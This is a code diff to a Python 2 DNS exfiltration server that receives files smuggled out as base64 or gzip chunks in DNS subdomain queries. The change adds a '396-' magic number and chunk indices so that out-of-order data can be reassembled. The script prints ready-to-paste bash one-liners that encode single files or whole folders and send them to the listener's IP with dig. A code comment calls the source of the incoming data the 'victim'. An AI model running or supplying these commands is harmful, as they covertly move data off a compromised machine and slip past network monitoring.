@@ -19,7 +19,7 @@ import base64
 
 c = { "r" : "\033[1;31m", "g": "\033[1;32m", "y" : "\033[1;33m", "b" : "\033[1;34m", "e" : "\033[0m" }
 VERSION = "2.0"
-	
+
 class DNSQuery:
 	def __init__(self, data):
 		self.data = data
@@ -50,13 +50,25 @@ def save_to_file(r_data, z, v):
 	print "\n"
 
 	for key,value in r_data.iteritems():
-		
+
 		file_seed = time.strftime("%Y-%m-%d_%H-%M-%S")
-		fname = "recieved_%s_%s" % (file_seed, key) 
+		fname = "recieved_%s_%s" % (file_seed, key)
 		flatdata = ""
 
-		for block in value:
-			flatdata += block[:-1].replace("*", "+") # fix data (remove hyphens at end, replace * with + because of dig!)
+		if v:
+			print("Reassembling {}".format(value))
+
+		try:
+			for i in range(0, max(value.keys()) + 1):
+				for block in value[i]:
+					fixed_block = block[:-1].replace("*", "+")
+					flatdata += fixed_block
+		except KeyError as err:
+			print "%s[Error]%s Missing index %s of file '%s'." % (c["r"], c["e"], i, key)
+
+		#for index, block in value.items():
+		# 	flatdata += block[:-1].replace("*", "+") # fix data (remove hyphens at end, replace * with + because of dig!)
+
 
 #		print flatdata
 
@@ -72,18 +84,18 @@ def save_to_file(r_data, z, v):
 		except:
 			f.close()
 			print "%s[Error]%s Incorrect padding on base64 encoded data.." % (c["r"], c["e"])
-			exit(1)				
+			exit(1)
 
 		if (z):
 			if v:
 			        print "%s[Info]%s Unzipping data (%s)." % (c["y"], c["e"], key)
-			
-			try:	
+
+			try:
 				x = zlib.decompressobj(16+zlib.MAX_WBITS)
-				flatdata = x.decompress(flatdata)	
+				flatdata = x.decompress(flatdata)
 			except:
 				print "%s[Error]%s Could not unzip data, did you specify the -z switch ?" % (c["r"], c["e"])
-				exit(1)				
+				exit(1)
 
 		        print "%s[Info]%s Saving recieved bytes to './%s'" % (c["y"], c["e"], fname)
 			f.write(flatdata)
@@ -92,7 +104,7 @@ def save_to_file(r_data, z, v):
 		        print "%s[Info]%s Saving bytes to './%s'" % (c["y"], c["e"], fname)
 			f.write(flatdata)
 			f.close()
-			
+
 
 		print "%s[md5sum]%s '%s'\n" % (c["g"], c["e"], hashlib.md5(open(fname, "r").read()).hexdigest())
 
@@ -107,16 +119,16 @@ def usage(str=""):
 	print
 	print "Advanced:"
 	print "\t-b\tBytes to send per subdomain                 (default = 57, max=63)"
-	print "\t-s\tNumber of data subdomains per request       (default =  4, ie. $data.$data.$data.$data.$filename)" 
+	print "\t-s\tNumber of data subdomains per request       (default =  4, ie. $data.$data.$data.$data.$filename)"
 	print "\t-f\tLength reserved for filename per request    (default = 17)"
 	print
 	print "%s$ python %s -z 127.0.0.1%s" % (c["g"], sys.argv[0], c["e"])
 	print
 	print "%s-------- Do not change the parameters unless you understand! --------%s" % (c["r"], c["e"])
-	print 
+	print
 	print "The query length cannot exceed 253 bytes. This is including the filename."
 	print "The subdomains lengths cannot exceed 63 bytes."
-	print 
+	print
 	print "Advanced: "
 	print "\t%s 127.0.0.1 -z -s 4 -b 57 -f 17\t4 subdomains, 57 bytes => (57 * 4 = 232 bytes) + (4 * '.' = 236). Filename => 17 byte(s)" % sys.argv[0]
 	print "\t%s 127.0.0.1 -z -s 4 -b 55 -f 29\t4 subdomains, 55 bytes => (55 * 4 = 220 bytes) + (4 * '.' = 224). Filename => 29 byte(s)" % sys.argv[0]
@@ -132,19 +144,19 @@ def p_cmds(s,b,ip,z):
 
 	if (z):
 		print "%s[?]%s Copy individual file (ZIP enabled)" % (c["y"], c["e"])
-		print """\t%s\x23%s %sf=file.txt%s; s=%s;b=%s;c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short; done """ % (c["r"], c["e"], c["y"], c["e"], s, b, ip )
+		print """\t%s\x23%s %sf=file.txt%s; s=%s;b=%s;c=0;ix=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne 396-.${ix}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done """ % (c["r"], c["e"], c["y"], c["e"], s, b, ip )
 		print
 		print "%s[?]%s Copy entire folder (ZIP enabled)" % (c["y"], c["e"])
-		print """\t%s\x23%s for f in $(ls .); do s=%s;b=%s;c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short; done ; done""" % (c["r"], c["e"], s, b, ip )
+		print """\t%s\x23%s for f in $(ls .); do s=%s;b=%s;c=0;ix=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne 396-.${ix}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done ; done""" % (c["r"], c["e"], s, b, ip )
 		print
 	else:
 		print "%s[?]%s Copy individual file" % (c["y"], c["e"])
-		print """\t%s\x23%s %sf=file.txt%s; s=%s;b=%s;c=0; for r in $(for i in $(base64 -w0 $f| sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short; done """ % (c["r"], c["e"], c["y"], c["e"], s, b, ip )
+		print """\t%s\x23%s %sf=file.txt%s; s=%s;b=%s;c=0;ix=0; for r in $(for i in $(base64 -w0 $f| sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne 396-.${ix}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done """ % (c["r"], c["e"], c["y"], c["e"], s, b, ip )
 		print
 		print "%s[?]%s Copy entire folder" % (c["y"], c["e"])
-		print """\t%s\x23%s for f in $(ls .); do s=%s;b=%s;c=0; for r in $(for i in $(base64 -w0 $f | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short; done ; done""" % (c["r"], c["e"], s, b, ip )
+		print """\t%s\x23%s for f in $(ls .); do s=%s;b=%s;c=0;ix=0; for r in $(for i in $(base64 -w0 $f | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne 396-.${ix}-.$r$f|tr "+" "*"` +short; ix=$(($ix+1)); done ; done""" % (c["r"], c["e"], s, b, ip )
 		print
-		
+
 
 def banner():
 
@@ -172,14 +184,14 @@ if __name__ == '__main__':
 
 	if "-h" in sys.argv or len(sys.argv) < 2:
 		usage()
-		exit(1)		
-	
+		exit(1)
+
 	ip = sys.argv[1]
 
 	if re.match(regx_ip, ip) == None:
 		usage("%s[Error]%s First argument must be listen address." % (c["r"], c["e"]))
 		exit(1)
-			
+
 	if "-z" in sys.argv:
 		z = True
 	if "-s" in sys.argv:
@@ -191,9 +203,11 @@ if __name__ == '__main__':
 	if "-v" in sys.argv:
 		v = True
 
-	if ( (b > 63) or ((b * s) > 253) or (((b * s) + flen) > 253)):
+	magic_nr_size = 4
+	max_index = 5
+	if ( (b > 63) or ((b * s) > 253) or (((b * s) + flen + magic_nr_size + max_index) > 253)):
 		usage("%s[Error]%s Entire query cannot be > 253. Read help (-h)" % (c["r"], c["e"]))
-	
+
 	############################################################################################
 	banner()
 
@@ -208,22 +222,22 @@ if __name__ == '__main__':
 	print "%s[+]%s DNS listening on '%s:53'" % (c["g"], c["e"], ip)
 	p_cmds(s,b,ip,z)
 	print "%s[+]%s Once files have sent, use Ctrl+C to exit and save.\n" % (c["g"], c["e"])
-  
+
 	try:
-		r_data = {}
+		r_data = {}  # map of: file-name -> (map of: index -> transmitted data)
 		while 1:
-      			# There is a bottle neck in this function, if very slow PC, will take
+			# There is a bottle neck in this function, if very slow PC, will take
 			# slightly longer to send as this main loop recieves the data from victim.
 
 			data, addr = udp.recvfrom(1024)
 			p=DNSQuery(data)
 			udp.sendto(p.request(ip), addr)
-	
+
 			req_split = p.data_text.split(".")
 			req_split.pop() # fix trailing dot... cba to fix this
 
 			dlen = len(req_split)
-			fname = ""	
+			fname = ""
 			tmp_data = []
 
 			for n in range(0,dlen):
@@ -236,25 +250,29 @@ if __name__ == '__main__':
 			fname = fname[:-1]
 
 			if fname not in r_data:
-				r_data[fname] = []
+				r_data[fname] = {}
 
-			# if we use an authoritative server instead of direct dns communication
-			# discard all messages with unexpected label count.
-			# if the client requests. e.g part1.part2.part.3.mydomain.xyz
-			# the recursive resolver may resolve. mydomain.xyz, part3.mydomain.xyz,
-			# part2.part3.mydomain.xyz before transimitting our payload
-			if len(tmp_data) != s:
+			if len(tmp_data) < 2:
+				if v:
+					print("Skipping packet: {} since it does have less than 2 payloads".format(req_split, expected_payloads))
 				continue
+
+			magic_nr = tmp_data[0]
+			if magic_nr != "396-":
+				if v:
+					print("Skipping packet: {} since it does not have magic nr 396)".format(req_split))
+				continue
+
+			index = int(tmp_data[1].rstrip("-"))
 
 			print "%s[>]%s len: '%d bytes'\t- %s" % (c["y"], c["e"], len(p.data_text), fname)
 			if v:
 				print '%s[>>]%s %s -> %s:53' % (c["b"], c["e"], p.data_text, ip)
 
-			for d in tmp_data:
-				r_data[fname].append(d)
+			r_data[fname][index] = tmp_data[2:]  # first 2 packets are not payload
 
 			# print r_data
-		
+
 	except KeyboardInterrupt:
 #		exit(1)
 		save_to_file(r_data, z, v)
